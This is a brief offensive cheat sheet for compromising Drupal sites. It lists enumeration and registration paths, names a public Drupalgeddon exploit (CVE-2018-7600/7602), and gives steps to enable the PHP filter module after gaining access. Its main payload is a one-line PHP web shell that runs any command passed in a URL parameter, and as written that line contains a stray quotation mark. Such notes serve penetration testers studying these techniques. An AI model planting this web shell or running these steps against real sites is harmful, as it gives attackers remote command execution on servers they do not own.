# Drupal
Various issues such as exploits and auto registration and username enumeration.

```
/user/login
/user/register
/user/password
/q?=admin/views/ajax/autocomplete/user/e
/admin/by-module
```

If access is obtained, turn on php filter module from `Module`
and use the php code below:
```
<?php
$output=shell_exec($_GET['CMD']);
echo "<pre>$output</pre>"'
?>
```

You can also enable **Code Filter** module and adding a content (article).  Then inside the article you can add php code.

CVE
```
CVE-2018-7600 & CVE-2018-7602 - https://github.com/pimps/CVE-2018-7600
```
